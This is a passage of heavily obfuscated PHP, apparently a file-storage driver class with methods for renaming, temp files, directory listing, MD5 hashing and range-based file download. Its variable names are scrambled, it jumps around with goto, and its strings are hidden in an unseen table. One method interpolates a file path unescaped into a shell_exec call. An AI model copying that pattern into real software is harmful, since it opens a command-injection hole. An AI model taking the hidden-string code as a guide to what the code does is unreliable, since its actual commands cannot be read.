$c¿§ËŠª×¾[68] . $B¼Ö»Ë‡¡] = $E›È˜Ê·ß®; goto E¹à¥¢Ö‰; aÒÄß†ê¥Ø: } public function getPathInner($d¹Ï‹÷…ïğ) { $BÒ‹ÑäĞ¢ = IO::init($d¹Ï‹÷…ïğ); return $BÒ‹ÑäĞ¢->path; } public function getPathOuter($B‚èù±§ë) { $CÊé‚¾„á½ =& $_SERVER[Šº]; $e‹ªçÇäóÏ = strlen(trim($this->pathBase, $CÊé‚¾„á½[8])); $B‚èù±§ë = substr(trim($B‚èù±§ë, $CÊé‚¾„á½[8]), $e‹ªçÇäóÏ); return $this->pathDriver . $CÊé‚¾„á½[8] . ltrim($B‚èù±§ë, $CÊé‚¾„á½[8]); } public function isParentOf($DÃÄÏÇë×, $Cê±éÚ¥Şå) { $a‹Š‰©ÚÃ« =& $_SERVER[Šº]; $DÃÄÏÇë× = rtrim(strtolower($DÃÄÏÇë×), $a‹Š‰©ÚÃ«[8]) . $a‹Š‰©ÚÃ«[8]; $Cê±éÚ¥Şå = rtrim(strtolower($Cê±éÚ¥Şå), $a‹Š‰©ÚÃ«[8]) . $a‹Š‰©ÚÃ«[8]; $eº–š‡«‰¬ = strpos($Cê±éÚ¥Şå, $DÃÄÏÇë×) === 0; return $eº–š‡«‰¬; } public function getType() { $F²É¹†» =& $_SERVER[Šº]; $cÛÕ…ã˜± = str_replace($F²É¹†»[72], $F²É¹†»[33], get_class($this)); return strtolower($cÛÕ…ã˜±); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($eáÎÑ‚Ê‹, $eÇƒÜ¹Ö–É) { $aÕºƒÇ¡Æº =& $_SERVER[Šº]; $c¦˜ß’¿¶¶ = rtrim($eáÎÑ‚Ê‹, $aÕºƒÇ¡Æº[8]) . $aÕºƒÇ¡Æº[8] . $eÇƒÜ¹Ö–É; $dˆ¦¦íÁ¸ = $this->exist($c¦˜ß’¿¶¶); return $dˆ¦¦íÁ¸ ? $c¦˜ß’¿¶¶ : !1; } public function setModifyTime($cÖª×õÖéé, $FŠ–ÉŒ‰‘  = '') { } public function renameObject($Fªä´‘³ê, $eôßÎô„ƒ—) { goto Dİ¹Ç²Ğ©Õ; Dİ¹Ç²Ğ©Õ: $AÖ…ÆÊ¼êÏ =& $_SERVER[Šº]; $b¤…ì…ÕÄ“ = $eôßÎô„ƒ—; Hook::trigger($AÖ…ÆÊ¼êÏ[73], $this, $Fªä´‘³ê, $this, $this->pathFather($Fªä´‘³ê) . $eôßÎô„ƒ—); goto e‘ßŒ›ö†ã; e‘ßŒ›ö†ã: $Fªä´‘³ê = $this->getPathOuter($Fªä´‘³ê); $eôßÎô„ƒ— = $this->pathFather($Fªä´‘³ê) . $eôßÎô„ƒ—; if (IO::isFile($Fªä´‘³ê)) { $bÖïÉŠ‚¼ = IO::copy($Fªä´‘³ê, $this->pathFather($Fªä´‘³ê), REPEAT_RENAME_FOLDER, $b¤…ì…ÕÄ“); if ($bÖïÉŠ‚¼) { IO::remove($Fªä´‘³ê); } } else { $bÖïÉŠ‚¼ = IO::mkdir($eôßÎô„ƒ—); if (!$bÖïÉŠ‚¼) { return !1; } $EèÅ«ñ„†à = IO::listPath($Fªä´‘³ê, !0); $F¸ËâÔÀÎ× = array_merge($EèÅ«ñ„†à[$AÖ…ÆÊ¼êÏ[74]], $EèÅ«ñ„†à[$AÖ…ÆÊ¼êÏ[75]]); foreach ($F¸ËâÔÀÎ× as $d—Á«¢ÁŒñ) { IO::move($d—Á«¢ÁŒñ[$AÖ…ÆÊ¼êÏ[76]], $eôßÎô„ƒ—, REPEAT_RENAME_FOLDER); } IO::remove($Fªä´‘³ê); } goto C§­œ£Ë¤†; C§­œ£Ë¤†: return $bÖïÉŠ‚¼ ? $eôßÎô„ƒ— : !1; goto C¨ƒƒ ±¬; C¨ƒƒ ±¬: } public function tempFile($c·–ñï¹Óæ = '', $aì’­£â´ = '') { goto Cí¼ƒ½¯ƒ; c÷Áğ½Î²¶: $fÑ›‰§Åè‚ = $bİãèö—ğ . $c·–ñï¹Óæ; @touch($fÑ›‰§Åè‚); if ($aì’­£â´) { file_put_contents($fÑ›‰§Åè‚, $aì’­£â´); } goto E¥åÅÍÕÓ; Cí¼ƒ½¯ƒ: if (!$c·–ñï¹Óæ) { $c·–ñï¹Óæ = rand_string(15); } $bİãèö—ğ = TEMP_FILES . rand_string(15) . $_SERVER[Šº][8]; @mkdir($bİãèö—ğ, 511, !0); goto c÷Áğ½Î²¶; E¥åÅÍÕÓ: return $fÑ›‰§Åè‚; goto cÙ¦‚öˆŠ“; cÙ¦‚öˆŠ“: } public function tempFileRemve($cóĞä´îÜ›) { @unlink($cóĞä´îÜ›); @rmdir($this->pathFather($cóĞä´îÜ›)); } public function mkfile($Aˆ›Ÿ×„‘, $D‹¦±Íë™Â = '', $CŒ†ĞñÔŠ„ = REPEAT_RENAME) { } public function mkdir($D˜ƒ£™±´, $cô‰…ÆŞˆŸ = REPEAT_SKIP) { } public function delFile($e¼®”‡©Èó) { } public function delFolder($Dˆ·‹­öÃ) { } public function copyFile($Cê‡°ŞÓ¸, $bÁá÷ÚÉå²) { } public function moveFile($CÎÍ¶„ò©, $A”ŸŸ÷Ú©¢) { } public function remove($dµ˜‘®À—ß) { if ($this->isFile($dµ˜‘®À—ß)) { return $this->delFile($dµ˜‘®À—ß); } return $this->delFolder($dµ˜‘®À—ß); } public function rename($C°º¶‡šÀ, $D‰µÔê‚™ğ) { } public function exist($c„½„›Ş‚î) { } public function findByHash($FöÑ¼¦Ş£İ = '', $Dô÷·¾‹Ñ = '') { return !1; } public function isFile($b¦´Á¾’‹®) { } public function isFolder($fÈ›î™†…Ä) { } public function size($d†èá¡…ª») { } public function info($Bƒ‹Å÷×¸) { } public function infoSimple($EñÍ¿Û¡) { return $this->info($EñÍ¿Û¡); } public function infoAuth($d²–œËÄ›) { return $this->info($d²–œËÄ›); } public function infoFull($BÃæ×¸½éâ) { return $this->info($BÃæ×¸½éâ); } public function infoWithChildren($bßŒ¢¬¼Û£) { $f¡êœ£ÚÒƒ =& $_SERVER[Šº]; static $AæÃÒ«Ñ = array(); if (isset($AæÃÒ«Ñ[$bßŒ¢¬¼Û£])) { return $AæÃÒ«Ñ[$bßŒ¢¬¼Û£]; } $B¦ÍÄ˜Ô¤® = $this->info($bßŒ¢¬¼Û£); if ($B¦ÍÄ˜Ô¤® && $B¦ÍÄ˜Ô¤®[$f¡êœ£ÚÒƒ[29]] == $f¡êœ£ÚÒƒ[77]) { $E˜Âõ‘Š± = array($f¡êœ£ÚÒƒ[78] => 0, $f¡êœ£ÚÒƒ[79] => 0, $f¡êœ£ÚÒƒ[80] => 0); $this->infoChildren($bßŒ¢¬¼Û£, $E˜Âõ‘Š±); $B¦ÍÄ˜Ô¤®[$f¡êœ£ÚÒƒ[78]] = $E˜Âõ‘Š±[$f¡êœ£ÚÒƒ[78]]; $B¦ÍÄ˜Ô¤®[$f¡êœ£ÚÒƒ[81]] = array($f¡êœ£ÚÒƒ[82] => $E˜Âõ‘Š±[$f¡êœ£ÚÒƒ[79]], $f¡êœ£ÚÒƒ[83] => $E˜Âõ‘Š±[$f¡êœ£ÚÒƒ[80]]); $AæÃÒ«Ñ[$bßŒ¢¬¼Û£] = $B¦ÍÄ˜Ô¤®; } return $B¦ÍÄ˜Ô¤®; } public function listPath($dÍè¥ó»Ê, $aÓêÌĞÜ¥ = false) { } public function has($B”ÂŠ¿ô™õ, $B´ìÕÜÙÆß = false, $cé‚¦àğ»º = false) { } public function canRead($bóæÇÀ‹õµ) { } public function canWrite($aŞĞó¾ÖÄ‹) { } public function getContent($f¸Ö±íŠæè) { } public function setContent($cŒ‹‹âè¹„, $D†ß ´¥ºæ = '') { } protected function infoChildren($C–İ½‰¦èæ, &$FºÎå¾œ…ß) { $cç¤½äèÄí =& $_SERVER[Šº]; check_abort_echo(); $E‚ÉÂ‰ßŒ = $this->listPath($C–İ½‰¦èæ, !0); $E‚ÉÂ‰ßŒ = array_merge($E‚ÉÂ‰ßŒ[$cç¤½äèÄí[75]], $E‚ÉÂ‰ßŒ[$cç¤½äèÄí[74]]); foreach ($E‚ÉÂ‰ßŒ as $d£¦ÛÏ¤ãÔ) { if ($d£¦ÛÏ¤ãÔ[$cç¤½äèÄí[29]] == $cç¤½äèÄí[77]) { $FºÎå¾œ…ß[$cç¤½äèÄí[80]]++; $Dğğ¾‡ğèµ = $this->getPathInner($d£¦ÛÏ¤ãÔ[$cç¤½äèÄí[76]]); $this->infoChildren($Dğğ¾‡ğèµ, $FºÎå¾œ…ß); } else { $FºÎå¾œ…ß[$cç¤½äèÄí[79]]++; $FºÎå¾œ…ß[$cç¤½äèÄí[78]] += $d£¦ÛÏ¤ãÔ[$cç¤½äèÄí[78]]; } } } public function fileSubstr($C¢øÀ‰ŒÁ¯, $aÍ—®²Á¨ì, $F‰‰§Ä“©Œ) { } public function listAll($AéÔŸ»œ) { } public function listAllMake($e°Éôåñ¼İ, &$E÷»®ãÄÁ–) { $b¬¡¯íÂóñ =& $_SERVER[Šº]; check_abort_echo(); $bğÔ—Õ¥œ´ = $this->listPath($e°Éôåñ¼İ, !0); if (!$bğÔ—Õ¥œ´) { return; } $FÆ ˜Îï›‚ = array_merge($bğÔ—Õ¥œ´[$b¬¡¯íÂóñ[75]], $bğÔ—Õ¥œ´[$b¬¡¯íÂóñ[74]]); foreach ($FÆ ˜Îï›‚ as $eĞˆÑ‹à£Ì) { goto B½œ‚ƒ…«; B½œ‚ƒ…«: $aåË®¤‚²Ñ = $eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[29]] == $b¬¡¯íÂóñ[77]; $bİİŒ‰éÈ² = array($b¬¡¯íÂóñ[76] => $eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[76]], $b¬¡¯íÂóñ[77] => $aåË®¤‚²Ñ); if (isset($eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[78]])) { $bİİŒ‰éÈ²[$b¬¡¯íÂóñ[78]] = $eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[78]]; } goto f´‚Ôâ‘äÜ; f´‚Ôâ‘äÜ: if (isset($eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[84]])) { $bİİŒ‰éÈ²[$b¬¡¯íÂóñ[84]] = $eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[84]]; } if (!$aåË®¤‚²Ñ) { $E÷»®ãÄÁ–[] = $bİİŒ‰éÈ²; continue; } $E÷»®ãÄÁ–[] = $bİİŒ‰éÈ²; goto aÙÃÁ½’Ó; aÙÃÁ½’Ó: $this->listAllMake($eĞˆÑ‹à£Ì[$b¬¡¯íÂóñ[76]], $E÷»®ãÄÁ–); goto A¬¤†ì…–; A¬¤†ì…–: } } public function listAllSimple($fŸ½ÄíÙË„) { $dÛçšù­¨© =& $_SERVER[Šº]; $cŞÑ±ëÁÙ¸ = array(); $bÜ¼Á‘¨Œ = $this->listAll($fŸ½ÄíÙË„); $c°¨”õõÈ = $this->getPathOuter($fŸ½ÄíÙË„); foreach ($bÜ¼Á‘¨Œ as $c‰Û‰Ü¹Ûâ) { goto AÅÄ±‰¹¥Ù; BŠÅ‡’«ğÓ: if (!$c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[77]]) { $AÎâŒßÖ…[$dÛçšù­¨©[86]] = $F³£±ÍĞ˜; } $cŞÑ±ëÁÙ¸[] = $AÎâŒßÖ…; goto E¦ƒ«ÆÚº; bˆÜ½Ôƒ—“: $AÎâŒßÖ… = array($dÛçšù­¨©[76] => $C«½°òÉˆ, $dÛçšù­¨©[77] => $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[77]]); if (isset($c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[78]]) && !$c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[77]]) { $AÎâŒßÖ…[$dÛçšù­¨©[78]] = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[78]]; } if (isset($c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[84]])) { $AÎâŒßÖ…[$dÛçšù­¨©[84]] = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[84]]; } goto BŠÅ‡’«ğÓ; AÅÄ±‰¹¥Ù: $F³£±ÍĞ˜ = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[76]]; $C«½°òÉˆ = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[76]]; if (isset($c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[85]])) { $F³£±ÍĞ˜ = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[85]][$dÛçšù­¨©[76]]; $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[78]] = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[85]][$dÛçšù­¨©[78]]; $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[84]] = $c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[85]][$dÛçšù­¨©[84]]; } else { $C«½°òÉˆ = substr($c‰Û‰Ü¹Ûâ[$dÛçšù­¨©[76]], strlen(get_path_father($c°¨”õõÈ))); $C«½°òÉˆ = $dÛçšù­¨©[8] . ltrim($C«½°òÉˆ, $dÛçšù­¨©[8]); } goto bˆÜ½Ôƒ—“; E¦ƒ«ÆÚº: } return $cŞÑ±ëÁÙ¸; } public function upload($aŠ †­¸âî, $E½—ò¢ó“³, $bœÎ·ÉÈ‰¨ = false, $c‡µë­–Äœ = REPEAT_REPLACE) { } public function uploadFileByID($dÜ‡âğšÀ, $a¡×‹¸ÙÅ‹, $cëÏÑ¬êÛ) { } public function uploadFileByPath($dÙ¨ÓôŸÔ­, $C¹õØ£‹Ã™, $cõœ´Òæ½ó = array()) { } public function isUploadServer() { $BÅ×ø“®¸§ =& $_SERVER[Šº]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $BÅ×ø“®¸§[87]) { return !0; } return $GLOBALS[$BÅ×ø“®¸§[6]][$BÅ×ø“®¸§[88]][$BÅ×ø“®¸§[89]]; } public function isFileOutServer() { $BÕË’‚òæó =& $_SERVER[Šº]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $BÕË’‚òæó[87]) { return !0; } return $GLOBALS[$BÕË’‚òæó[6]][$BÕË’‚òæó[88]][$BÕË’‚òæó[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($CÀ¶Œ½°Æ) { $FË¦¸©ñ¥ß =& $_SERVER[Šº]; if (!$this->isCdnHost()) { return $CÀ¶Œ½°Æ; } return str_replace(trim(get_url_root($CÀ¶Œ½°Æ), $FË¦¸©ñ¥ß[8]), trim($this->cdnHost, $FË¦¸©ñ¥ß[8]), $CÀ¶Œ½°Æ); } public function uploadLink($f¡äÏàÙ½Ù, $bÙ¬äÌíß— = 0) { goto bºİÄ³›ä; d…ƒåÛÎ­: if ($aïã··•á) { $aïã··•á[$F‡ ´ïæç´[93]] = $f¡äÏàÙ½Ù; $aïã··•á[$F‡ ´ïæç´[94]] = $F°ÏÎŠ­Ò; } return $aïã··•á; goto Bî‚ÖÜ¤™; f‘ì…×Úİğ: if (!in_array($F°ÏÎŠ­Ò, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $B†µ°½ŸØÏ = 1024 * 1024 * 10; goto b…Ô¦ùºôù; b…Ô¦ùºôù: $fã½Á ¤³ = $bÙ¬äÌíß— <= $B†µ°½ŸØÏ ? $F‡ ´ïæç´[91] : $F‡ ´ïæç´[92]; $cÚçƒ‹¶ = (!$bÙ¬äÌíß— ? 1 : ceil($bÙ¬äÌíß— / pow(1024, 3))) * 3600 * 4; $aïã··•á = $this->{$fã½Á ¤³}($f¡äÏàÙ½Ù, $cÚçƒ‹¶); goto d…ƒåÛÎ­; bºİÄ³›ä: $F‡ ´ïæç´ =& $_SERVER[Šº]; if ($this->isUploadServer()) { return; } $F°ÏÎŠ­Ò = $this->getType(); goto f‘ì…×Úİğ; Bî‚ÖÜ¤™: } public function uploadFormData($FÚÙ‚Ã×½™, $dœÀ¥»Äµ = 3600) { } public function multiUploadFormData($Dç ã£¾†˜, $D³š¤ÊÖ‹˜ = 3600) { } public function download($A‘…øõ®, $E…£‰‡Ğˆ¡) { } public function ext($f½¯ã¶‚ìŠ) { $D’Ú™ÑäÓ² =& $_SERVER[Šº]; if (strpos($f½¯ã¶‚ìŠ, $D’Ú™ÑäÓ²[8]) === -1) { $DÁŸõˆ²µ° = $f½¯ã¶‚ìŠ; } else { $DÁŸõˆ²µ° = $this->pathThis($f½¯ã¶‚ìŠ); } $Dˆº—áØ†ª = $D’Ú™ÑäÓ²[33]; if (strstr($DÁŸõˆ²µ°, $D’Ú™ÑäÓ²[95])) { $Dˆº—áØ†ª = substr($DÁŸõˆ²µ°, strrpos($DÁŸõˆ²µ°, $D’Ú™ÑäÓ²[95]) + 1); $Dˆº—áØ†ª = strtolower($Dˆº—áØ†ª); } if (strlen($Dˆº—áØ†ª) > 3 && preg_match($D’Ú™ÑäÓ²[96], $Dˆº—áØ†ª, $Fßò‚êœŠ)) { $Dˆº—áØ†ª = $D’Ú™ÑäÓ²[33]; } return $Dˆº—áØ†ª; } public function pathThis($b«¾õ·¢´) { $A™¿¡Ø–¨÷ =& $_SERVER[Šº]; $b«¾õ·¢´ = str_replace($A™¿¡Ø–¨÷[97], $A™¿¡Ø–¨÷[8], rtrim($b«¾õ·¢´, $A™¿¡Ø–¨÷[8])); $eªïšñÆŠ× = strrpos($b«¾õ·¢´, $A™¿¡Ø–¨÷[8]); if ($eªïšñÆŠ× === !1) { return $b«¾õ·¢´; } return substr($b«¾õ·¢´, $eªïšñÆŠ× + 1); } public function pathFather($föÙÆÇŠ‚ï) { $b£åÄšÚêÃ =& $_SERVER[Šº]; $föÙÆÇŠ‚ï = str_replace($b£åÄšÚêÃ[97], $b£åÄšÚêÃ[8], rtrim($föÙÆÇŠ‚ï, $b£åÄšÚêÃ[8])); $d©¯ÏÄÙÆ = strrpos($föÙÆÇŠ‚ï, $b£åÄšÚêÃ[8]); if ($d©¯ÏÄÙÆ === !1) { return $b£åÄšÚêÃ[33]; } return substr($föÙÆÇŠ‚ï, 0, $d©¯ÏÄÙÆ + 1); } public function hashSimple($f™Ù¸¸‘‡) { goto F …àéšà; E§÷öôÂŸ³: $Aëğ×ÇÜ¹ = 200; $D¡Ê¥Øõà = 50; if ($c¼‡º¾×÷¸ <= $Aëğ×ÇÜ¹ * $D¡Ê¥Øõà) { return $this->hashMd5($f™Ù¸¸‘‡) . $c¼‡º¾×÷¸; } goto B«çĞ¬§Â; däì°•¢ÖÎ: $bÖßËçÈ„ .= $this->fileSubstr($f™Ù¸¸‘‡, $c¼‡º¾×÷¸ - $Aëğ×ÇÜ¹, $Aëğ×ÇÜ¹); return md5($bÖßËçÈ„) . $c¼‡º¾×÷¸; goto D—³÷õ½³‡; B«çĞ¬§Â: $bœé­³„å = intval($c¼‡º¾×÷¸ / $D¡Ê¥Øõà); $bÖßËçÈ„ = $Aôçğœ¹èƒ[33]; for ($A»¥×‰“é = 0; $A»¥×‰“é < $D¡Ê¥Øõà; $A»¥×‰“é++) { $bÖßËçÈ„ .= $this->fileSubstr($f™Ù¸¸‘‡, $bœé­³„å * $A»¥×‰“é, $Aëğ×ÇÜ¹); } goto däì°•¢ÖÎ; F …àéšà: $Aôçğœ¹èƒ =& $_SERVER[Šº]; if (!$f™Ù¸¸‘‡) { return md5($Aôçğœ¹èƒ[33]); } $c¼‡º¾×÷¸ = $this->size($f™Ù¸¸‘‡); goto E§÷öôÂŸ³; D—³÷õ½³‡: } public static $md5Cache = array(); public function hashMd5($d°İÃ»ÓÕä) { $d°İÃ»ÓÕä = $this->iconvSystem($d°İÃ»ÓÕä); if (isset(self::$md5Cache[$d°İÃ»ÓÕä])) { return self::$md5Cache[$d°İÃ»ÓÕä]; } self::$md5Cache[$d°İÃ»ÓÕä] = $this->hashMd5Shell($d°İÃ»ÓÕä); if (!self::$md5Cache[$d°İÃ»ÓÕä]) { self::$md5Cache[$d°İÃ»ÓÕä] = @md5_file($d°İÃ»ÓÕä); } return self::$md5Cache[$d°İÃ»ÓÕä]; } private function hashMd5Shell($dÄ‡À±ŞÂÒ) { goto E¥é©Ï•; f™ôÖÁ˜äÜ: $f«Ü¶ÚäôÒ = shell_exec($fì·•á£é . "\40\x22{$dÄ‡À±ŞÂÒ}\42"); $f«Ü¶ÚäôÒ = str_replace($EÎÚ˜îÁôÅ[104], $EÎÚ˜îÁôÅ[33], $f«Ü¶ÚäôÒ); return substr($f«Ü¶ÚäôÒ, 0, 32); goto FƒºßÎ’ù; c¦™›„ÜºÖ: $fì·•á£é = Cache::get($EÎÚ˜îÁôÅ[101]); if (!$fì·•á£é) { $c ğããÓ¢„ = BASIC_PATH . $EÎÚ˜îÁôÅ[102]; $bÊ¸öƒ„Ôğ = md5_file($c ğããÓ¢„); $fì·•á£é = $EÎÚ˜îÁôÅ[103]; foreach ($B¦¡†¬¿ˆ as $Aïš‹¸Ş›ò) { $f«Ü¶ÚäôÒ = shell_exec($Aïš‹¸Ş›ò . "\x20\42{$c ğããÓ¢„}\42"); if ($f«Ü¶ÚäôÒ && substr(trim($f«Ü¶ÚäôÒ), 0, 32) == $bÊ¸öƒ„Ôğ) { $fì·•á£é = $Aïš‹¸Ş›ò; break; } } Cache::set($EÎÚ˜îÁôÅ[101], $fì·•á£é, 3600); } if ($fì·•á£é == $EÎÚ˜îÁôÅ[103]) { return !1; } goto f™ôÖÁ˜äÜ; E¥é©Ï•: $EÎÚ˜îÁôÅ =& $_SERVER[Šº]; if (!function_exists($EÎÚ˜îÁôÅ[98])) { return !1; } $B¦¡†¬¿ˆ = array($EÎÚ˜îÁôÅ[99], $EÎÚ˜îÁôÅ[100]); goto c¦™›„ÜºÖ; FƒºßÎ’ù: } public function link($FºÏ»Í‹°­) { return $FºÏ»Í‹°­; } public function fileOut($b‹â²é¶ÜŞ, $EÈæ‚ößå = false, $c’öİèğà¼ = false, $AèâÎ†”ó = '') { goto BÂÙ¨‘æ’; d–ï¶ä ãé: if (in_array($eÆÌ³ª¼Áå, array($b¼ˆ›†›[111], $b¼ˆ›†›[112], $b¼ˆ›†›[113], $b¼ˆ›†›[114]))) { $eÆÌ³ª¼Áå = $b¼ˆ›†›[115]; } if (!$AèâÎ†”ó) { $AèâÎ†”ó = md5($Eó®öÚ®ì° . $this->hashSimple($b‹â²é¶ÜŞ)); } $AèâÎ†”ó = $b¼ˆ›†›[116] . $AèâÎ†”ó . $b¼ˆ›†›[116]; goto cÕ˜ ÷­¹; d¸º¬Ş°±è: $EÔ™³ßØÇô = strtolower($_SERVER[$b¼ˆ›†›[142]]); if ($fˆé‚óËÜº && $EÔ™³ßØÇô && $D‹±ó™Ì¬¤) { if (strstr($EÔ™³ßØÇô, $b¼ˆ›†›[143])) { header($b¼ˆ›†›[144] . $b‹â²é¶ÜŞ); } else { if (strstr($EÔ™³ßØÇô, $b¼ˆ›†›[145])) { header($b¼ˆ›†›[146] . $b‹â²é¶ÜŞ); } else { if (strstr($EÔ™³ßØÇô, $b¼ˆ›†›[147])) { header($b¼ˆ›†›[148] . $b‹â²é¶ÜŞ); } } } if ($DéìÓ»î°ù) { header($b¼ˆ›†›[149] . $DéìÓ»î°ù); } return; } if (isset($_SERVER[$b¼ˆ›†›[150]])) { if (preg_match($b¼ˆ›†›[151], $_SERVER[$b¼ˆ›†›[150]], $bØ¯¦¨¾øˆ)) { $côë•„˜†Ê = intval($bØ¯¦¨¾øˆ[1]); if (!empty($bØ¯¦¨¾øˆ[2])) { $còÂ™ÈŒ… = intval($bØ¯¦¨¾øˆ[2]); } } header($b¼ˆ›†›[152]); header("\103\157\156\164\145\156\x74\x2d\x52\x61\156\x67\145\x3a\x20\x62\x79\164\145\163\40{$côë•„˜†Ê}\x2d{$còÂ™ÈŒ…}\x2f" . $A®ÈÍõ‹õØ); } else { header($b¼ˆ›†›[153]); } goto a¿’âÚÒŸ£; d„åÁ¤Ÿ…: if ($DéìÓ»î°ù) { $a¢ÌªøËÄ = intval(1000 * 1000 * ($eïĞˆå…±Ğ / $DéìÓ»î°ù)); } while ($côë•„˜†Ê <= $còÂ™ÈŒ…) { $dÍíÈäí = timeFloat(); check_abort(); $eÖù ©ĞÉ = $còÂ™ÈŒ… - $côë•„˜†Ê + 1; if ($eÖù ©ĞÉ <= $eïĞˆå…±Ğ) { $eïĞˆå…±Ğ = $eÖù ©ĞÉ; } echo $this->fileSubstr($b‹â²é¶ÜŞ, $côë•„˜†Ê, $eïĞˆå…±Ğ); $côë•„˜†Ê += $eïĞˆå…±Ğ; if ($eïĞˆå…±Ğ == $eÖù ©ĞÉ) { $côë•„˜†Ê = $còÂ™ÈŒ… + 1; } if ($a¢ÌªøËÄ) { $e„ƒ¦ï±¿ = intval(1000 * 1000 * (timeFloat() - $dÍíÈäí)); $b¿†»‘ó‡  = $a¢ÌªøËÄ - $e„ƒ¦ï±¿; if ($b¿†»‘ó‡  > 5) { usleep($b¿†»‘ó‡ ); } } } goto aµÂÛ¨; câªºàùì‹: $CÍ¹‘å¢Ş› = $b¼ˆ›†›[116] . $CÍ¹‘å¢Ş› . $b¼ˆ›†›[122] . $CÍ¹‘å¢Ş›; if ($EÈæ‚ößå) { header($b¼ˆ›†›[123]); header($b¼ˆ›†›[124] . $CÍ¹‘å¢Ş›); } else { header($b¼ˆ›†›[125] . $CÍ¹‘å¢Ş›); } header($b¼ˆ›†›[126] . gmdate($b¼ˆ›†›[110], time() + 3600 * 24 * 30) . $b¼ˆ›†›[127]); goto FÕùÙæ‚¾; D ¿ù¾×ƒ: if ($_SERVER[$b¼ˆ›†›[157]] == $b¼ˆ›†›[158]) { return; } $eïĞˆå…±Ğ = 1024 * 100; $a¢ÌªøËÄ = 0; goto d„åÁ¤Ÿ…; BÂÙ¨‘æ’: $b¼ˆ›†› =& $_SERVER[Šº]; $this->cacheMethod(null, null); if (!$b‹â²é¶ÜŞ || !$this->exist($b‹â²é¶ÜŞ)) { show_json(LNG($b¼ˆ›†›[105]), !1, $c’öİèğà¼); } goto F­‹­™Ùâ; cÕ˜ ÷­¹: $DÆºƒ¨Ù = get_file_mime($eÆÌ³ª¼Áå); if (strstr($DÆºƒ¨Ù, $b¼ˆ›†›[117])) { $DÆºƒ¨Ù = $DÆºƒ¨Ù . $b¼ˆ›†›[118]; } if ($EÈæ‚ößå === !1 && !mime_support($DÆºƒ¨Ù)) { $EÈæ‚ößå = !0; $DÆºƒ¨Ù = $b¼ˆ›†›[119]; } goto Eá¿›ŒŒ‰¿; FÕùÙæ‚¾: header($b¼ˆ›†›[128]); header($b¼ˆ›†›[129]); header($b¼ˆ›†›[130]); goto aë·Ÿ±Ë¸Ÿ; dÁ¿—´–Ğ: $A®ÈÍõ‹õØ = $F™µ¾ò¥Îæ[$b¼ˆ›†›[78]]; $Eó®öÚ®ì° = gmdate($b¼ˆ›†›[110], $F™µ¾ò¥Îæ[$b¼ˆ›†›[84]]); $fíİÀƒ = $c’öİèğà¼ ? $c’öİèğà¼ : $this->iconvApp($F™µ¾ò¥Îæ[$b¼ˆ›†›[28]]); goto B÷ğù…•àŠ; cÔÂ§ÒÒ™Ç: @ob_end_clean(); set_timeout(); $F™µ¾ò¥Îæ = $this->infoFull($b‹â²é¶ÜŞ); goto dÁ¿—´–Ğ; a¿’âÚÒŸ£: $A·…ßè‡ÊË = !0; if ($_SERVER[$b¼ˆ›†›[154]] == $b¼ˆ›†›[155] && $A®ÈÍõ‹õØ > 1204 * 1024 * 1024 * 2) { $A·…ßè‡ÊË = !1; } if ($A·…ßè‡ÊË) { header($b¼ˆ›†›[156] . ($còÂ™ÈŒ… - $côë•„˜†Ê + 1)); } goto D ¿ù¾×ƒ; F¤µÓ­èè±: header($b¼ˆ›†›[135] . $Eó®öÚ®ì° . $b¼ˆ›†›[127]); header($b¼ˆ›†›[136] . $fíİÀƒ); header($b¼ˆ›†›[137]); goto cÔ”Ÿ©õô; aë·Ÿ±Ë¸Ÿ: if (isset($_SERVER[$b¼ˆ›†›[131]]) && strtotime($_SERVER[$b¼ˆ›†›[131]]) == $F™µ¾ò¥Îæ[$b¼ˆ›†›[84]]) { header($b¼ˆ›†›[132], !0, 304); die; } if (isset($_SERVER[$b¼ˆ›†›[133]]) && $_SERVER[$b¼ˆ›†›[133]] == $AèâÎ†”ó) { header($b¼ˆ›†›[134] . $AèâÎ†”ó, !0, 304); die; } header($b¼ˆ›†›[134] . $AèâÎ†”ó); goto F¤µÓ­èè±; B÷ğù…•àŠ: $côë•„˜†Ê = 0; $còÂ™ÈŒ… = $A®ÈÍõ‹õØ - 1; $eÆÌ³ª¼Áå = $this->ext($fíİÀƒ); goto d–ï¶ä ãé; cÔ”Ÿ©õô: header($b¼ˆ›†›[138] . $A®ÈÍõ‹õØ); header($b¼ˆ›†›[139]); if (!$EÈæ‚ößå && $eÆÌ³ª¼Áå == $b¼ˆ›†›[140]) { if ($A®ÈÍõ‹õØ > 1024 * 1024 * 5) { die; } $b¤çÍÂ‡ôù = $this->getContent($b‹â²é¶ÜŞ); $b¤çÍÂ‡ôù = Html::clearSVG($b¤çÍÂ‡ôù); header($b¼ˆ›†›[141] . strlen($b¤çÍÂ‡ôù)); echo $b¤çÍÂ‡ôù; die; } goto d¸º¬Ş°±è; Eá¿›ŒŒ‰¿: header($b¼ˆ›†›[120]); header($b¼ˆ›†›[121] . $DÆºƒ¨Ù); $CÍ¹‘å¢Ş› = rawurlencode($fíİÀƒ); goto câªºàùì‹; F­‹­™Ùâ: $fˆé‚óËÜº = $this->getType() 